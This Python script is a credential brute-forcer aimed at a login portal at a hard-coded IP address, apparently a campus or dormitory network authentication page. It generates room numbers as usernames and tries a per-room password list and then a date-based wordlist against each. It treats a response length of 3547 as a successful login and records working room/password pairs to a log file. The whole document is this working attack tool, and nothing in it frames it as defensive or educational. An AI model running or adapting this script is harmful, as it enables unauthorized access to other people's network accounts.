import requests

# http request fun
def postform(room, passwd):
    url = 'http://218.195.105.242'
    form = {'0MKKey': '123456', 'DDDDD': room, 'R1': '0', 'R2': '1', 'para': '00', 'upass': passwd}
    headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Languang': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Referer': url, 
            'host': '218.195.105.242', 
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0'
            }

    r = requests.post(url, data = form, headers=headers)

    # print(r.headers['Content-Length'])
    # print(r.text)

    return r.headers['Content-Length']


if __name__ == "__main__":

    success = open("./success.rom", "a") # success log file
    todo = 0 # conut

    # start
    for i in range(1,9):
        for j in range(1,6):
            for k in range(1,9):
                room = str(i) + str(j) + '0' + str(k)
                print(room)
                # jump some room
                #if room == '2103' or room == '2306' or room == '6201' or room == '6203' or room == '1301' or room == '3103':
                #    todo+=1
                #    continue
                
                datepass = open("./datepass", "r") # data passwd file
                roompass = open("./roompass", "r") # room passwd file
                passwd = roompass.readlines()[todo] # get room passwd
                todo+=1
                rea = postform(room, passwd) # try by room passwd
                # try success
                if rea == '3547':
                    print("room: " + room)
                    success.write(room + "\nroom\n") # write
                    continue

                while True:
                    line=datepass.readline() # get date passwd
                    if line:
                        re = postform(room, line) # try by date passwd
                        # try success
                        if re == '3547':
                            print("room: " + room)
                            print("pass: " + line)
                            success.write(room + "\n" + line + "\n") # write
                            break
                    else:
                        break
                # close files
                datepass.close()
                roompass.close()
    success.close()
